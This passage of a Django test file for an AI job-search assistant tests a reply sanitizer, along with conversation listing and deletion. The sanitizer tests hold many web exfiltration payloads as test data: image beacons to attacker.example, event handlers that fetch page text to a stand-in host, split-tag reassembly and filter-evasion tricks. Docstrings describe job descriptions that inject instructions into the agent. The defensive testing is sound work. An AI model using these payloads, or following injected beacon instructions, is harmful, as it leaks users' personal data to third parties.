        with self.assertRaises(AIProviderError):
            self._send("boom", responses=[RuntimeError("503 backend unavailable")],
                       conversation_id=first["conversation_id"], checkpointer=saver)
        self.assertEqual(Conversation.objects.count(), 1)

    # --- the reply itself ----------------------------------------------------

    def test_reply_is_a_string_even_for_block_content(self):
        """A Pro/thinking model can return content blocks; the OpenAPI contract
        and the frontend both promise a string."""
        from langchain_core.messages import AIMessage
        out = self._send("hi", responses=[AIMessage(
            content=[{"type": "text", "text": "Hello "},
                     {"type": "text", "text": "world"}],
            usage_metadata={"input_tokens": 1, "output_tokens": 1, "total_tokens": 2})])
        self.assertEqual(out["reply"], "Hello world")

    def test_reply_strips_markdown_images_that_would_exfiltrate_the_profile(self):
        """A job description can instruct the agent to embed a tracking image.
        Rendering it would beacon the seeker's data to the post's author."""
        out = self._send("tell me about the job", responses=[self._reply(
            "Good fit! ![](https://attacker.example/p?d=Ada%20Lovelace%20Python)")])
        self.assertNotIn("attacker.example", out["reply"])
        self.assertIn("Good fit!", out["reply"])

    def test_reply_strips_bare_urls_and_keeps_link_text(self):
        out = self._send("hi", responses=[self._reply(
            "See [this role](https://attacker.example/x) or https://attacker.example/y")])
        self.assertNotIn("attacker.example", out["reply"])
        self.assertIn("this role", out["reply"])

    def test_never_logs_the_message_body(self):
        with self.assertLogs("apps.ai", level="INFO") as logs:
            self._send("my secret salary expectation is 200k",
                       responses=[self._reply("noted")])
        self.assertNotIn("200k", "\n".join(logs.output))


class SanitizeReplyTests(TestCase):
    """Direct coverage for _sanitize_reply. Fix-round finding: the pre-fix
    implementation only stripped markdown images/links and http(s)/ftp/data
    bare URLs — raw HTML tags, entity-encoded schemes, protocol-relative
    URLs, and reference-style link targets all survived it and could still
    exfiltrate a seeker's data to a job description's author.

    Second fix-round pass: the FIRST fix over-corrected. A blanket
    `</?[a-zA-Z]...>` tag matcher mangled ordinary text (`a<b and b>c`,
    `List<int>`, prose discussing `<div>`/`<span>`), an enumerated scheme
    list (`https?|ftp|data`) left every other scheme (`ws://`, `file://`)
    completely unfiltered, and an unqualified `//...` matcher ate ordinary
    double-slash prose (`2024//2025`). This class now also pins the fidelity
    and prose cases the second pass fixed, alongside the vectors it closed
    (`www.` autolinks, non-enumerated schemes, and a scheme assembled from a
    tag that is deliberately NOT on the dangerous-tag allowlist)."""

    def _clean(self, text):
        from apps.ai.services import _sanitize_reply
        return _sanitize_reply(text)

    # --- vectors that survived the pre-fix implementation --------------------

    def test_strips_raw_img_tag_with_protocol_relative_src(self):
        out = self._clean('Nice fit! <img src="//attacker.example/p?d=Ada">')
        self.assertNotIn("attacker.example", out)
        self.assertIn("Nice fit!", out)

    def test_strips_reference_style_link_target(self):
        out = self._clean("Good fit!\n\n[r]: //attacker.example/p?d=Ada")
        self.assertNotIn("attacker.example", out)
        self.assertIn("Good fit!", out)

    def test_strips_entity_encoded_scheme_in_img_src(self):
        out = self._clean('Nice! <img src="https&#58;//attacker.example/p">')
        self.assertNotIn("attacker.example", out)
        self.assertIn("Nice!", out)

    def test_strips_raw_anchor_tag_but_keeps_visible_text(self):
        out = self._clean(
            'Check this: <a href="//attacker.example/p?d=Ada">hi</a>')
        self.assertNotIn("attacker.example", out)
        self.assertIn("hi", out)

    # --- vectors that survived the FIRST fix-round pass -----------------------

    def test_strips_www_prefixed_url_with_no_scheme(self):
        """GitHub-flavoured markdown (and most chat renderers) autolink a
        bare www.host.tld even with no scheme and no leading slashes."""
        out = self._clean(
            "Check out www.attacker.example/p?d=Ada for more")
        self.assertNotIn("attacker.example", out)

    def test_strips_non_enumerated_scheme_url(self):
        """ws:// is not http(s)/ftp/data, but a rendering client can still
        act on it — an enumerated scheme list is a hole, not a filter."""
        out = self._clean("Connect to ws://attacker.example/p now")
        self.assertNotIn("attacker.example", out)

    def test_strips_url_assembled_from_a_non_dangerous_tag(self):
        """<b> is deliberately NOT on the dangerous-tag allowlist (it cannot
        fetch anything by itself), so it is never stripped — this proves the
        protocol-relative matcher still catches the //host tail regardless
        of what precedes it, rather than relying on tag-stripping to
        (incorrectly) assemble and then miss a recognisable scheme."""
        out = self._clean("Connect to ws:<b>//attacker.example/p now")
        self.assertNotIn("attacker.example", out)

    # --- regression: behaviour that must still hold ---------------------------

    def test_still_strips_markdown_image(self):
        out = self._clean(
            "Good fit! ![](https://attacker.example/p?d=Ada%20Lovelace)")
        self.assertNotIn("attacker.example", out)
        self.assertIn("Good fit!", out)

    def test_still_keeps_markdown_link_text(self):
        out = self._clean(
            "See [this role](https://attacker.example/x) for more")
        self.assertNotIn("attacker.example", out)
        self.assertIn("this role", out)

    def test_still_strips_autolink(self):
        out = self._clean("Check <https://attacker.example/y> for details")
        self.assertNotIn("attacker.example", out)

    def test_indented_fenced_code_block_keeps_leading_indentation(self):
        text = "Sure, here you go:\n\n    def foo():\n        return 1\n"
        out = self._clean(text)
        self.assertIn("    def foo():", out)
        self.assertIn("        return 1", out)

    # --- fidelity: ordinary text must survive intact ---------------------------
    #
    # ROUND-5 CONTRACT CHANGE (deliberate, user-approved — NOT a weakening).
    # _sanitize_reply now ends with html.escape(..., quote=False), so any
    # angle bracket that survives the matchers arrives as an entity. These
    # assertions therefore pin the ESCAPED form instead of byte-identity.
    # The text itself is still fully preserved — nothing is deleted, and in a
    # markdown/HTML client `&lt;` renders back to `<`, which is strictly
    # better than the old behaviour where `a<b and b>c` handed the client a
    # live (inert) <b> tag and the rest of the line rendered bold. Prose with
    # no `<`, `>` or `&` in it is still byte-identical — see
    # test_ordinary_prose_without_markup_characters_is_byte_identical.

    def test_angle_bracket_comparison_survives_escaped(self):
        self.assertEqual(self._clean("if a<b and b>c: pass"),
                         "if a&lt;b and b&gt;c: pass")

    def test_generic_type_syntax_survives_escaped(self):
        self.assertEqual(self._clean("List<int> x; Map<String, Integer> y;"),
                         "List&lt;int&gt; x; Map&lt;String, Integer&gt; y;")

    def test_prose_discussing_html_tags_survives_escaped(self):
        self.assertEqual(self._clean("Use the <div> element and <span> inline."),
                         "Use the &lt;div&gt; element and &lt;span&gt; inline.")

    def test_ordinary_prose_without_markup_characters_is_byte_identical(self):
        """The escape step only touches `&`, `<` and `>`. Prose carrying none
        of them must come through untouched, character for character."""
        for text in [
            "Acme Inc. is hiring three Python engineers.",
            "Reach the team at ada@example.com any weekday.",
            "Available 2024//2025",
            "Salary band: 90k-120k (plus equity).",
            "Ada's CV lists Django, Postgres and Celery.",
            'She said "great fit" twice.',
            "Sure, here you go:\n\n    def foo():\n        return 1\n",
        ]:
            with self.subTest(text=text):
                self.assertEqual(self._clean(text), text.strip())

    def test_ampersand_in_prose_is_escaped(self):
        """Pinning the one visible cost of the escape step so it is a
        recorded contract rather than a surprise: `&` becomes `&amp;`, which
        a markdown/HTML client renders back as `&`."""
        self.assertEqual(self._clean("R&D and Q&A both report to Ada"),
                         "R&amp;D and Q&amp;A both report to Ada")

    # --- prose that merely contains "//" must survive intact -------------------

    def test_year_range_with_double_slash_survives_intact(self):
        text = "Available 2024//2025"
        self.assertEqual(self._clean(text), text)

    def test_and_or_with_double_slash_survives_intact(self):
        text = "and//or both work"
        self.assertEqual(self._clean(text), text)

    def test_unix_path_with_double_slash_survives_intact(self):
        text = "Binaries live in /usr//local/bin"
        self.assertEqual(self._clean(text), text)

    def test_bare_domain_with_double_slash_page_survives_intact(self):
        text = "See example.com//page for the changelog"
        self.assertEqual(self._clean(text), text)

    # --- fidelity: round-3 additions --------------------------------------------

    def test_cpp_template_syntax_survives_escaped(self):
        self.assertEqual(self._clean("std::vector<std::string> v;"),
                         "std::vector&lt;std::string&gt; v;")

    def test_arrow_function_with_comparisons_survives_escaped(self):
        """Contains both "=" and "<"/">" near each other, but never in the
        <name ...=...> shape the attribute-assignment matcher looks for —
        the only "<" is immediately followed by a digit, which can never
        start a tag name. Nothing is deleted; the brackets and the "&&" are
        entity-escaped by the round-5 final step."""
        self.assertEqual(self._clean("const f = (a) => a<10 && a>1;"),
                         "const f = (a) =&gt; a&lt;10 &amp;&amp; a&gt;1;")

    # --- N1: an expanded tag name list plus a generic attribute-bearing ---------
    # --- catch-all, not URL-matcher awareness of exotic host forms --------------

    def test_strips_image_tag_with_decimal_ipv4_src(self):
        """<image> parses as <img> in every HTML5 parser but was not on the
        round-2 allowlist. The decimal-IPv4 host (no dot) would also evade
        every URL matcher — irrelevant here because the whole tag, src and
        all, is removed as one unit."""
        out = self._clean('Great fit! <image src="//3232235777/p?d=Ada">')
        self.assertEqual(out, "Great fit!")

    def test_strips_image_tag_with_idna_dot_src(self):
        """U+3002 (IDEOGRAPHIC FULL STOP) is IDNA-mapped to "." by browsers
        but is not literally a dot our URL matchers would recognise."""
        out = self._clean("Great fit! <image src=\"//attacker。example/p?d=Ada\">")
        self.assertEqual(out, "Great fit!")

    def test_strips_image_tag_with_ipv6_literal_src(self):
        out = self._clean('Great fit! <image src="//[2001:db8::1]/p?d=Ada">')
        self.assertEqual(out, "Great fit!")

    def test_strips_any_attribute_bearing_tag_regardless_of_name(self):
        """<body>/<table>/<frame>/<portal>/<button> are the same shape as
        <image>: some are on the expanded name list, some (table) are not
        and rely entirely on the generic "any tag with an attribute
        assignment" catch-all. Visible text (the button's "click") survives
        even though the tag markup around it does not."""
        self.assertEqual(
            self._clean('Nice <body background="//3232235777/p?d=Ada">'),
            "Nice")
        self.assertEqual(
            self._clean('Nice <table background="//3232235777/p?d=Ada">'),
            "Nice")
        self.assertEqual(
            self._clean('Nice <frame src="//3232235777/p?d=Ada">'),
            "Nice")
        self.assertEqual(
            self._clean('Nice <portal src="//3232235777/p?d=Ada">'),
            "Nice")
        self.assertEqual(
            self._clean(
                'Nice <button formaction="//3232235777/p?d=Ada">click</button>'),
            "Nice click")

    # --- N2: event handlers on an otherwise-inert, unlisted tag -----------------

    def test_strips_event_handler_url_built_via_charcode(self):
        """No scheme, no "//", no "www." literally present in the raw
        text — nothing for a content-sniffing URL matcher to catch. The
        payload only exists once the div's onmouseover fires. The div is
        not on the dangerous-tag list, but it carries an attribute
        assignment, so it is removed structurally without needing to
        understand the JavaScript inside it."""
        out = self._clean(
            '<div onmouseover="location=String.fromCharCode(47,47)'
            '+\'a.tld\'">x</div>')
        self.assertNotIn("a.tld", out)
        self.assertIn("x", out)

    def test_strips_event_handler_url_built_via_unicode_escape(self):
        out = self._clean(
            '<div onmouseover="fetch(\'\\u002f\\u002f\'+\'host.tld/p?d=\'+'
            'document.body.innerText)">hover</div>')
        self.assertNotIn("host.tld", out)
        self.assertIn("hover", out)

    # --- N3: fixed-point tag stripping (a single pass can reassemble one) -------

    def test_strips_script_tag_reassembled_from_split_fragments(self):
        """A single .sub() pass removes the inner <img src=x> tag, which
        splices "<scr" and "ipt>" back together into an intact "<script>"
        that a one-shot substitution would never re-scan for."""
        out = self._clean(
            '<scr<img src=x>ipt>fetch("HOST"+document.body.innerText)'
            '</script>')
        self.assertNotIn("<script>", out)
        self.assertNotIn("<img", out)

    def test_strips_img_tag_reassembled_from_split_fragments(self):
        out = self._clean('<i<img src=y>mg src="//3232235777/p?d=Ada">')
        self.assertNotIn("3232235777", out)
        self.assertNotIn("<img", out)

    def test_strips_iframe_tag_reassembled_from_split_fragments(self):
        out = self._clean('<ifr<a href=z>ame src="//3232235777/p"></iframe>')
        self.assertNotIn("3232235777", out)
        self.assertNotIn("<iframe", out)

    # --- N4: the protocol-relative matcher must not eat its own delimiter -------

    def test_protocol_relative_url_does_not_swallow_closing_paren(self):
        text = "Our mirror (//cdn.example.tld/p) is fast"
        out = self._clean(text)
        self.assertNotIn("cdn.example.tld", out)
        self.assertEqual(out, "Our mirror () is fast")

    # --- R1: HTML5 treats "/" as an attribute separator -------------------------

    def _assert_no_live_markup(self, out):
        """Round-trip the sanitized text through a REAL HTML tokenizer.

        String matching only proves our own regexes agree with themselves.
        html.parser is what tells us whether a browser would still see an
        element: `<img/src=x>` contains no space, so the round-3
        `\\s`-anchored matcher left it alone, yet html.parser reports
        tag='img' attrs=[('src', 'x')] for it — a live beacon.

        Since round 5 ends the pipeline with html.escape, the bar is now NO
        ELEMENT AT ALL rather than "no element carrying attributes": the
        residual `</div>` shapes earlier rounds tolerated as cosmetic are
        `&lt;/div&gt;` now, so the tokenizer sees plain text.
        """
        from html.parser import HTMLParser

        found = []

        class _Collect(HTMLParser):
            def handle_starttag(self, tag, attrs):
                found.append(("start", tag, attrs))

            handle_startendtag = handle_starttag

            def handle_endtag(self, tag):
                found.append(("end", tag, []))

        parser = _Collect()
        parser.feed(out)
        parser.close()
        self.assertEqual(found, [], f"markup survived in {out!r}")

    def test_solidus_separated_attributes_are_stripped(self):
        """HTML5's tokenizer treats "/" inside a tag as an attribute
        separator, so every one of these is a fully-formed tag to a browser
        even though none has whitespace after the tag name. The decimal-IPv4
        host has no dot, so the protocol-relative matcher is no backstop —
        tag stripping is the only thing standing between these and the
        seeker's data."""
        beacon = "//3232235777/p?d=Ada"
        for raw in [
            f'<img/src="{beacon}">',
            f'<image/src="{beacon}">',
            f'<iframe/src="{beacon}">',
            f"<svg/onload=\"fetch('{beacon}')\">",
            f'<video/poster="{beacon}">',
            f'<object/data="{beacon}">',
            f'<img//src="{beacon}">',
            f'<img/ src="{beacon}">',
            f'<IMG/SRC="{beacon}">',
        ]:
            with self.subTest(raw=raw):
                out = self._clean(raw)
                self.assertEqual(out, "")
                self._assert_no_live_markup(out)

    def test_solidus_separated_event_handler_on_an_unlisted_tag_is_stripped(self):
        """Same separator trick, but on a tag whose NAME is harmless — only
        the unlisted-name branch can catch this one."""
        out = self._clean(
            "<div/onmouseover=\"fetch('//3232235777/p?d=Ada')\">x</div>")
        self.assertIn("x", out)
        self.assertNotIn("3232235777", out)
        self._assert_no_live_markup(out)

    # --- R2: the pass bound must fail CLOSED, not open --------------------------

    @staticmethod
    def _nested_payload(depth):
        """Split-tag nesting: each level's own text reassembles into a live
        <img ...> only after the level inside it is removed, so depth n needs
        n+1 substitution passes to fully clear."""
        beacon = '<img src="//3232235777/p?d=Ada">'
        for _ in range(depth):
            beacon = '<i' + beacon + 'mg src="//3232235777/p?d=Ada">'
        return beacon

    def test_nesting_within_the_pass_bound_still_clears(self):
        raw = self._nested_payload(9)
        self.assertEqual(self._clean(raw), "")

    def test_nesting_that_exhausts_the_pass_bound_fails_closed(self):
        """Depth 10 needs 11 passes. Before the fix the loop gave up and
        returned its residue — an intact `<img src="//3232235777/p?d=Ada">`
        straight to the client. ~350 characters, comfortably inside a
        1024-token reply and fully specifiable from an injected job
        description."""
        raw = self._nested_payload(10)
        self.assertLess(len(raw), 400, "payload must stay cheap to be a real threat")
        out = self._clean(raw)
        self.assertEqual(out, "")
        self._assert_no_live_markup(out)

    def test_nesting_one_past_the_bound_fails_closed(self):
        """Depth 11's residue was `<i<img src="//...">mg src="//...">` — not
        even a single well-formed tag, which is exactly why "return whatever
        is left" is not a safe answer."""
        out = self._clean(self._nested_payload(11))
        self.assertEqual(out, "")
        self._assert_no_live_markup(out)

    def test_deep_nesting_far_past_the_bound_fails_closed(self):
        for depth in (12, 25, 60):
            with self.subTest(depth=depth):
                out = self._clean(self._nested_payload(depth))
                self.assertEqual(out, "")
                self._assert_no_live_markup(out)

    # --- R3: generic default parameters are not HTML attributes -----------------

    def test_generic_default_parameters_survive_escaped(self):
        """`<typename T = int>` has an "=" between "<" and ">" but is not a
        tag: real attribute assignments bind their name tightly (`src=`,
        `onmouseover=`), while a generic default is a spaced ` = ` after a
        type parameter. Round-3 DELETED the whole span; round 4 stopped
        deleting it; round 5 additionally escapes the brackets (see the
        contract note above) — the type parameter itself is intact either
        way."""
        for text, expected in [
            ("template <typename T = int> class Foo;",
             "template &lt;typename T = int&gt; class Foo;"),
            ("template<int N = 4> struct S;",
             "template&lt;int N = 4&gt; struct S;"),
            ("function f<T = string>(x: T) { return x; }",
             "function f&lt;T = string&gt;(x: T) { return x; }"),
            ("struct Foo<T = u32>;", "struct Foo&lt;T = u32&gt;;"),
        ]:
            with self.subTest(text=text):
                self.assertEqual(self._clean(text), expected)

    def test_comparison_prose_with_an_equals_between_the_brackets_survives(self):
        self.assertEqual(
            self._clean("Trigger it if x<y and z=1 then w>0 holds."),
            "Trigger it if x&lt;y and z=1 then w&gt;0 holds.")

    def test_multi_line_prose_is_never_swallowed_by_one_stray_bracket(self):
        """The worst of the round-3 over-matches: `[^<>]*` matched newlines,
        so a single `<word ` could eat an unbounded multi-line span up to the
        next ">" whenever an "=" fell in between — this three-line reply
        collapsed to "Use ad.". All three lines must survive; round 5 escapes
        their brackets but deletes nothing."""
        self.assertEqual(
            self._clean("Use a<b for the check\nand set flag=1 when done\n"
                        "so that c>d."),
            "Use a&lt;b for the check\nand set flag=1 when done\n"
            "so that c&gt;d.")

    # --- R3 guard: the tightened branch must still catch real payloads ----------

    def test_unlisted_tag_with_an_attribute_payload_is_still_stripped(self):
        """Constraining the unlisted-name branch must not reopen it. Each of
        these is a legal HTML attribute shape: first-position, non-first
        position, spaced "=", and newline-separated."""
        beacon = "//3232235777/p?d=Ada"
        for raw in [
            f'<div onmouseover="fetch(\'{beacon}\')">x</div>',
            f'<body background="{beacon}">x',
            f'<table background="{beacon}">x',
            f'<div hidden onmouseover="fetch(\'{beacon}\')">x</div>',
            f'<div onmouseover = "fetch(\'{beacon}\')">x</div>',
            f'<div\nonmouseover="fetch(\'{beacon}\')">x</div>',
        ]:
            with self.subTest(raw=raw):
                out = self._clean(raw)
                self.assertIn("x", out)
                self.assertNotIn("3232235777", out)
                self._assert_no_live_markup(out)

    # --- R5: escaping ends the arms race ----------------------------------------
    #
    # Rounds 1-4 each closed a tag shape and each time the next review found
    # another one. These are the shapes still live entering round 5, all
    # verified as fetch-capable elements by round-tripping the round-4
    # sanitizer's OUTPUT through html.parser. None of them is fixed by a new
    # regex: they are fixed by html.escape running last, which is why the
    # assertion is "the tokenizer sees no element", not "some pattern is
    # absent".

    def test_newline_attribute_separators_are_neutralised(self):
        """A newline is a legal attribute separator ANYWHERE inside a tag —
        before the "=", after it, between attributes, inside a quoted value,
        even splitting an attribute name in two. Round 4 banned newlines from
        the unlisted-name branch's body to stop it swallowing multi-line
        prose, and that ban is exactly what these nine walk through. Each one
        was a live element in round 4:

            '<div style\\n="background:url(//3232235777/p?d=Ada)">x</div>'
              -> unchanged; html.parser: div style='background:url(//...)'
        """
        beacon = "//3232235777/p?d=Ada"
        for raw in [
            f'<div style\n="background:url({beacon})">x</div>',
            f'<div onmouseover\n=\n"fetch(\'{beacon}\')">x</div>',
            f'<table background\n="{beacon}">x',
            f'<td background\n="{beacon}">x',
            f'<div onmouseover\t\n= "fetch(\'{beacon}\')">x</div>',
            f'<div onmouseover="fetch(\n\'{beacon}\')">x</div>',
            f'<span data\n = "{beacon}" onclick="f()">x</span>',
            f'<section back\nground="{beacon}">x</section>',
            f'<div onmouseover="fetch(\'{beacon}\')"\n>x</div>',
        ]:
            with self.subTest(raw=raw):
                out = self._clean(raw)
                self.assertIn("x", out)
                self._assert_no_live_markup(out)

    def test_hyphenated_custom_element_names_are_neutralised(self):
        """Branch B's name class is `[a-zA-Z][a-zA-Z0-9]*`, which cannot
        express a custom element. Browsers happily run an event handler on
        one. Pre-existing since round 3; free to close now."""
        beacon = "//3232235777/p?d=Ada"
        for raw in [
            f'<my-el onmouseover="fetch(\'{beacon}\')">x</my-el>',
            f'<my-el\nonmouseover\n="fetch(\'{beacon}\')">x</my-el>',
            f'<x-y data\n="{beacon}">x</x-y>',
        ]:
            with self.subTest(raw=raw):
                out = self._clean(raw)
                self.assertIn("x", out)
                self._assert_no_live_markup(out)

    def test_angle_bracket_inside_a_quoted_attribute_value_is_neutralised(self):
        """`[^<>\\n]*` stops dead at the "<" inside the handler body, so the
        matcher never reaches the closing ">" and the whole tag survived.
        Quoting rules are a tokenizer's job, not a regex's."""
        out = self._clean(
            '<div onmouseover="if(a<b)fetch(\'//3232235777/p?d=Ada\')">x</div>')
        self.assertIn("x", out)
        self._assert_no_live_markup(out)

    def test_sanitizing_twice_equals_sanitizing_once(self):
        """The leading html.unescape undoes the trailing html.escape, so the
        function is a fixed point after one application. Worth pinning: a
        reply that is re-sanitized (replayed from a checkpoint, re-rendered,
        passed through a second layer) must not accumulate `&amp;amp;`."""
        beacon = "//3232235777/p?d=Ada"
        corpus = [
            "",
            "Plain reply with no markup at all.",
            "if a<b and b>c: pass",
            "R&D and Q&A both report to Ada",
            "template <typename T = int> class Foo;",
            f'<img src="{beacon}">',
            f'<div style\n="background:url({beacon})">x</div>',
            f'<my-el onmouseover="fetch(\'{beacon}\')">x</my-el>',
            "See [this role](https://attacker.example/x) or www.attacker.example/p",
            "Good fit! ![](https://attacker.example/p?d=Ada)",
            "&lt;img src=x&gt;",
            "Sure:\n\n    def foo():\n        return 1\n",
        ]
        for text in corpus:
            with self.subTest(text=text):
                once = self._clean(text)
                self.assertEqual(self._clean(once), once)

    def test_double_encoded_markup_never_decodes_into_markup(self):
        """`&amp;lt;img src=x&amp;gt;` is what a model emits when it wants a
        client that decodes once to see `&lt;img src=x&gt;` — and a client
        that decodes twice to see a live tag. For THIS entity-encoded input,
        one decode of our output yields inert text, never markup — that does
        not generalize to raw markup that survived stripping, which
        reconstitutes under decode-then-parse (see
        test_hyphenated_custom_element_names_are_neutralised and friends for
        that case). The guarantee that holds unconditionally: a client that
        renders the reply as HTML/markdown, without pre-decoding, sees no
        element."""
        import html as _html

        out = self._clean("&amp;lt;img src=x&amp;gt; is how you write it")
        self.assertEqual(out, "&amp;lt;img src=x&amp;gt; is how you write it")
        decoded_once = _html.unescape(out)
        self.assertEqual(decoded_once, "&lt;img src=x&gt; is how you write it")
        self._assert_no_live_markup(decoded_once)


class ListConversationsTests(_ChatServiceFixture, TestCase):
    def test_returns_own_conversations_newest_first(self):
        from apps.ai.models import Conversation
        from apps.ai.services import list_conversations
        old = Conversation.objects.create(
            user=self.seeker, title="older",
            created_at=timezone.now() - timedelta(hours=2))
        new = Conversation.objects.create(user=self.seeker, title="newer")
        self.assertEqual([c["id"] for c in list_conversations(self.seeker)],
                         [str(new.id), str(old.id)])

    def test_returns_only_id_title_created_at(self):
        from apps.ai.models import Conversation
        from apps.ai.services import list_conversations
        Conversation.objects.create(user=self.seeker, title="mine")
        self.assertEqual(set(list_conversations(self.seeker)[0]),
                         {"id", "title", "created_at"})

    def test_never_returns_another_users_conversations(self):
        from apps.ai.models import Conversation
        from apps.ai.services import list_conversations
        other = UserAccount.objects.create_user(
            email="other2@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        Conversation.objects.create(user=other, title="theirs")
        self.assertEqual(list_conversations(self.seeker), [])

    def test_empty_list_when_none(self):
        from apps.ai.services import list_conversations
        self.assertEqual(list_conversations(self.seeker), [])

    def test_listing_is_capped(self):
        """Every chat POST without a conversation_id creates a row; unpaginated
        this response grows without bound."""
        from apps.ai.models import Conversation
        from apps.ai.services import MAX_LISTED_CONVERSATIONS, list_conversations
        for i in range(MAX_LISTED_CONVERSATIONS + 10):
            Conversation.objects.create(user=self.seeker, title=f"c{i}")
        self.assertEqual(len(list_conversations(self.seeker)),
                         MAX_LISTED_CONVERSATIONS)

    def test_query_budget(self):
        from django.db import connection
        from django.test.utils import CaptureQueriesContext
        from apps.ai.models import Conversation
        from apps.ai.services import list_conversations
        for i in range(15):
            Conversation.objects.create(user=self.seeker, title=f"c{i}")
        with CaptureQueriesContext(connection) as ctx:
            list_conversations(self.seeker)
        self.assertLessEqual(len(ctx), 10)


class DeleteConversationTests(_ChatServiceFixture, TestCase):
    def test_deletes_the_row_and_the_checkpointer_thread(self):
        from apps.ai.models import Conversation
        from apps.ai.services import delete_conversation
        saver = self._saver()
        sent = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
        cid = sent["conversation_id"]
        delete_conversation(self.seeker, conversation_id=cid, checkpointer=saver)
        self.assertEqual(Conversation.objects.count(), 0)
        self.assertIsNone(saver.get_tuple({"configurable": {"thread_id": cid}}))

    def test_another_users_conversation_is_not_found(self):
        from apps.ai.exceptions import ConversationNotFoundError
        from apps.ai.models import Conversation
        from apps.ai.services import delete_conversation
        intruder = UserAccount.objects.create_user(
            email="nosy2@example.com", password="Str0ng-Password!",
            user_type="job_seeker")
        mine = Conversation.objects.create(user=self.seeker, title="private")
        with self.assertRaises(ConversationNotFoundError):
            delete_conversation(intruder, conversation_id=str(mine.id),
                                checkpointer=self._saver())
        self.assertEqual(Conversation.objects.count(), 1)

    def test_unknown_id_raises_not_found(self):
        from apps.ai.exceptions import ConversationNotFoundError
        from apps.ai.services import delete_conversation
        with self.assertRaises(ConversationNotFoundError):
            delete_conversation(
                self.seeker, conversation_id="00000000-0000-0000-0000-000000000000",
                checkpointer=self._saver())

    def test_malformed_id_raises_not_found_not_500(self):
        from apps.ai.exceptions import ConversationNotFoundError
        from apps.ai.services import delete_conversation
        with self.assertRaises(ConversationNotFoundError):
            delete_conversation(self.seeker, conversation_id="nope",
                                checkpointer=self._saver())

    def test_thread_is_deleted_before_the_row(self):
        """Ordering is the whole safety argument: a failure must never leave
        unreachable chat content behind."""
        from apps.ai.models import Conversation
        from apps.ai.services import delete_conversation
        order = []

        class _Saver:
            def delete_thread(self, thread_id):
                order.append(("thread", Conversation.objects.count()))

        conversation = Conversation.objects.create(user=self.seeker, title="x")
        delete_conversation(self.seeker, conversation_id=str(conversation.id),
                            checkpointer=_Saver())
        self.assertEqual(order, [("thread", 1)])   # row still present at purge
        self.assertEqual(Conversation.objects.count(), 0)

    def test_row_survives_when_the_thread_delete_fails(self):
        """Client retries; nothing is silently half-deleted."""
        from apps.ai.models import Conversation
        from apps.ai.services import delete_conversation

        class _Broken:
            def delete_thread(self, thread_id):
                raise RuntimeError("checkpointer unreachable")

        conversation = Conversation.objects.create(user=self.seeker, title="x")
        with self.assertRaises(RuntimeError):
            delete_conversation(self.seeker, conversation_id=str(conversation.id),
                                checkpointer=_Broken())
        self.assertEqual(Conversation.objects.count(), 1)

    def test_default_checkpointer_falls_back_to_get_checkpointer(self):
        """Every other test in this class injects a checkpointer explicitly,
        so none of them would catch a regression of the `checkpointer or
        get_checkpointer()` fallback itself. Patches
        apps.ai.services.get_checkpointer — the name delete_conversation
        actually calls for that fallback — not apps.ai.signals.get_checkpointer:
        delete_conversation always attaches _checkpointer to the instance
        before deleting it, so the RECEIVER's own fallback is never reached
        on this path; only the service's is."""
        from apps.ai.models import Conversation
        from apps.ai.services import delete_conversation
        saver = self._saver()
        conversation = Conversation.objects.create(user=self.seeker, title="x")
        with patch("apps.ai.services.get_checkpointer", return_value=saver):
            delete_conversation(self.seeker, conversation_id=str(conversation.id))
        self.assertEqual(Conversation.objects.count(), 0)
        self.assertIsNone(
            saver.get_tuple({"configurable": {"thread_id": str(conversation.id)}}))


class ConversationPurgeSignalTests(_ChatServiceFixture, TestCase):
    def test_deleting_the_user_purges_the_checkpointer_thread(self):
        """CASCADE removes the row; without the signal the MESSAGES survive in
        Postgres, unreachable and unpurgeable. This is the erasure path."""
        saver = self._saver()
        sent = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
        cid = sent["conversation_id"]
        self.assertIsNotNone(saver.get_tuple({"configurable": {"thread_id": cid}}))
        with patch("apps.ai.signals.get_checkpointer", return_value=saver):
            self.seeker.delete()
        self.assertIsNone(saver.get_tuple({"configurable": {"thread_id": cid}}))

    def test_bulk_queryset_delete_purges_the_thread(self):
        from apps.ai.models import Conversation
        saver = self._saver()
        sent = self._send("hello", responses=[self._reply("hi")], checkpointer=saver)
        cid = sent["conversation_id"]
        with patch("apps.ai.signals.get_checkpointer", return_value=saver):
            Conversation.objects.filter(user=self.seeker).delete()
        self.assertIsNone(saver.get_tuple({"configurable": {"thread_id": cid}}))

    def test_fast_delete_is_disabled_so_the_signal_actually_fires(self):
        """Django skips signals on its fast-delete path; registering a receiver
        is what disables it. Assert that directly."""
        from django.db.models.deletion import Collector
        from apps.ai.models import Conversation
        collector = Collector(using="default")
        self.assertFalse(collector.can_fast_delete(
            Conversation.objects.filter(user=self.seeker)))


class GetConversationMessagesTests(_ChatServiceFixture, TestCase):
    def test_returns_the_transcript_in_order(self):
        from apps.ai.services import get_conversation_messages
        saver = self._saver()
        sent = self._send("first question", responses=[self._reply("first answer")],
                          checkpointer=saver)
        self._send("second question", responses=[self._reply("second answer")],
                   conversation_id=sent["conversation_id"], checkpointer=saver)
        out = get_conversation_messages(
            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
        self.assertEqual(
            [(m["role"], m["content"]) for m in out["messages"]],
            [("user", "first question"), ("assistant", "first answer"),
             ("user", "second question"), ("assistant", "second answer")])

    def test_includes_the_conversation_metadata(self):
        from apps.ai.services import get_conversation_messages
        saver = self._saver()
        sent = self._send("hello there", responses=[self._reply("hi")],
                          checkpointer=saver)
        out = get_conversation_messages(
            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
        self.assertEqual(out["id"], sent["conversation_id"])
        self.assertEqual(out["title"], "hello there")
        self.assertIn("created_at", out)

    def test_omits_tool_calls_and_tool_results(self):
        """A transcript is what the participants said, not the machinery."""
        from apps.ai.services import get_conversation_messages
        saver = self._saver()
        sent = self._send("any python roles?", responses=[
            self._toolcall("search_jobs", {"keywords": "python"}),
            self._reply("Yes, one.")], checkpointer=saver)
        out = get_conversation_messages(
            self.seeker, conversation_id=sent["conversation_id"], checkpointer=saver)
        self.assertEqual([m["role"] for m in out["messages"]], ["user", "assistant"])
        self.assertEqual(out["messages"][1]["content"], "Yes, one.")

    def test_sanitizes_stored_assistant_text(self):
        from apps.ai.services import get_conversation_messages
        saver = self._saver()
        sent = self._send("hi", responses=[self._reply(
            "See ![](https://attacker.example/p?d=Ada)")], checkpointer=saver)
        out = get_conversation_messages(
